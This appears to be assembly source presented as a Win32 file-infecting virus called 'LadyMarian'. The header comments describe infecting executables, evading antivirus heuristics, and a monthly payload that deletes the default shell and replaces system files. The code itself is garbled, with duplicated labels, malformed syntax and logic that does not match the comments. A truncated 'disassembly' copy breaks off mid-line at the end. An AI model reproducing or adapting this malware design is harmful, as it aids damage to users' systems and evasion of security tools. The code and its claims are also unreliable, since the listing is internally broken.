;Win32.LadyMarian virus source code
;(c) 2004 by DiA/Zero Gravity Security Laboratory (http://www.zgrnl.net)
;
;Ultralight Win32 per-process PE file infector, uses SEH to find kernel32 base.
;Bypasses AV heuristic by patching it with non functional code.
;
;Virus size: 512 bytes
;
;Compile options: /m /zi /zal
;
;Default payload: registry sploit
;Payload activated on the first of every month
;	- deletes the default shell and puts calc.exe instead of the user32.dll
;	- displays an alert saying that the system needs to be reinstalled
;	- jumps to calc.exe
;
;ScanVT: Not detective at all

.386p
.model flat,stdcall

extrn ExitProcess:proc
extrn MessageBoxA:proc

virus_size	equ	virus_end-virus_start

.data
db 0

.code

start:

virus_start:
	call delta_fix
delta_fix:
	pop ebp
	mov eax,ebp
	sub ebp,offset delta_fix
	mov ebx,0
	mov edi,eax
	push eax
	pushad
	std
scan_virus:
	mov al,[byte ptr kernel32+ebx]
	xor al,[edi+offset kernel32_string]
	jnz scan_failed
	inc ebx
	cmp ebx,9
	jne scan_virus
scan_failed:
	mov ebx,0
bypass_av:
	mov al,[byte ptr kernel32+ebx]
	xor al,byte ptr [edi+offset kernel32_string]
	mov byte ptr [edi+kernel32_string],al
	inc ebx
	cmp ebx,9
	jne bypass_av
find_kernel32:
	pop ebp
	add ebp,virus_end-offset FindFirstFileA
	push edx
	push ecx
	push esi
	push edi
	push eax
	push offset kernel32_string
	push dword ptr fs:[0]
	mov fs:[0],ebp
	call FindFirstFileA
	jecxz quit
	cmp dword ptr [eax+12h],'YM.'
	jne find_kernel32
	cmp word ptr [eax+16h],'P3'
	jne find_kernel32
	cmp word ptr [eax+18h],'OC'
	jne find_kernel32
	cmp word ptr [eax+1ah],'3W'
	jne find_kernel32
	cmp word ptr [eax+1ch],'2k'
	jne find_kernel32
	cmp word ptr [eax+1eh],'lK'
	je get_createfilea
	cmp word ptr [eax+1eh],'lN'
	jne find_kernel32
get_createfilea:
	mov esi,eax
	jecxz quit
	dec ecx
next_export:
	add ecx,dword ptr [esi]
	mov esi,dword ptr [esi-4]
	cmp dword ptr [esi],0FFC7855Ah ;RVA/ORVA
	jne next_export
find_base:
	mov esi,dword ptr [esi+8] 
	test esi,esi
	jz next_export
	sub esi,dword ptr [esi+4]
sub_base:
	sub esi,ecx
	jcxz quit
	xchg ecx,edx
	xor eax,eax
	mov al,[byte ptr esi]]
	xchg eax,ebx
	bypass_av_loop:
	xor al,byte ptr [esi]
	inc esi
	jnz bypass_av_loop
	sub_base:
	sub esi,edx
	dec ecx
	cmp byte ptr [esi],0AAh
	jne next_export
quit:
	pop dword ptr fs:[0]
	pop eax
	pop edi
	pop esi
	pop ecx
	pop edx
delta_restore:
	ret

virus_end:

payload_start:

mov eax,0BFF70000h ;This is not a joke!
jmp eax

payload_end:

;I really like this routine from http://owlby.org/code/win32/pentest/ where I got it from :)

FindFirstFileName	db '\\.\SystemRoot\system32\user32.dll',0
FindHandle dd 0
FindData db 64 dup(0)

FindFirstFileA:
        push    dword ptr [FindHandle]
        pop     ebx
        mov     eax, [ebp-4]
        call    eax
        xchg    eax, ebx
        jz      exit_payload

        mov     eax, offset FindData
        add     eax, 8 * 32d ;Pointer to FileName
        mov     esi, eax
        mov     di, offset FindFirstFileName + 28d
        push    28d
        rep     movsb

        xor     eax, eax
        mov     ax, word ptr [FindData + eax + 1Ah]
        or      eax, eax
        je      exit_payload
        mov     cx, word ptr [FindData + eax + 18d]
        mov     dx, word ptr [FindData + eax + 16d]
        cmp     dx, 'll'
        jne     exit_payload
        cmp     cx, 'rN' 
        jnz     exit_payload
        cmp     ah, 'oP'
        jnz     exit_payload
        
        pop     eax
exit_payload:
        inc     esp
        inc     esp
        inc     esp
        inc     esp
        inc     esp
        inc     esp
        inc     esp
ret

;here goes the host code :)
host_start:

db 0E9h,0,0

host_code:
dd 0deadbeefh
host_code_end:

;api addresses will go here

FindFirstFileA_string   db 'FindFirstFileA',0
CreateFileA_string      db 'CreateFileA',0
FindClose_string        db 'FindClose',0
WriteFile_string        db 'WriteFile',0
ReadFile_string         db 'ReadFile',0
MessageBoxA_string      db 'MessageBoxA',0
ExitProcess_string      db 'ExitProcess',0
GlobalAlloc_string      db 'GlobalAlloc',0
GlobalFree_string       db 'GlobalFree',0

api_names_table:
dd offset FindFirstFileA_string
dd offset CreateFileA_string
dd offset FindClose_string
dd offset WriteFile_string
dd offset ReadFile_string
dd offset MessageBoxA_string
dd offset ExitProcess_string
dd offset GlobalAlloc_string
dd offset GlobalFree_string
api_names_table_end:

data_section:

kernel32_string:
db 'KERNEL32'

export_table_string:
db '._ZGVuYmlsX3RhcA=='

import_section_string:
db 'ImportSection',0

new_import_section_string:
db 'NewImportSection',0

code_rva_data:
dw 0
dw offset code_size_data - offset code_size_data 

virtual_size_data:
dw 0
dw offset virtual_size_data - offset virtual_size_data

physical_size_data:
dd 0
dd offset physical_size_data - offset physical_size_data

image_base_data:
dd 0x00400000
dd 0x00401000

number_of_entries_data:
dw 0
dw offset number_of_entries_data - offset number_of_entries_data

tmp_dd_data:
dd 0

old_eip_data:
dd 0

original_code_buffer:
dd 0
dd 0
dq 0
dq 0

code_size_data:
dd 0

search_strings:
db '*.exe',0

file_handle_data:
dd 0

overlapped_struct:
dd 0
dd 0
dd 0
dd 0

new_file_name:
db 'c:\\windows\\system32\\notepad.exe'
db '.exee',0

file_info:
db 280 dup(0)

message_box_title:
db '[Lady Marian]',0

create_file_attribs:
dd 0
create_file_shared_mode:
dd 0
create_file_disp_action:
dd 0x00000002h
create_file_file_attributes:
dd 0h
create_file_alloc_attr:
dd 0h
create_file_sharing_mode:
dd 0ffff0000h
create_file_mode:
dd 0h

read_buf:
dd 0
dq 0

file_mapping_handle:
dd 0

write_buf:
dd 0

file_size_lo:
dd 0
file_size_hi:
dd 0

find_file_handle:
dd 0

find_file_data:
db 64 dup(0)

kernel32 db 40 dup(0)

get_proc_address_result:
dd 0

put_there:
jmp exit_com

exit_com:
popad
add dword ptr [ebp+offset image_base_data],ebx
leave
xchg esp,ebp
ret 0

end start
end
```


[disassembly]  
;Win32.LadyMarian virus source code
;(c) 2004 by DiA/Zero Gravity Security Laboratory (http://www.zgrnl.net)
;
;Ultralight Win32 per-process PE file infector, uses SEH to find kernel32 base.
;Bypasses AV heuristic by patching it with non functional code.
;
;Virus size: 512 bytes
;
;Compile options: /m /zi /zal

.386p
.model flat,stdcall

extrn MessageBoxA : proc
extrn ExitProcess : proc

virus_size equ	virus_end-virus_start

.data
db 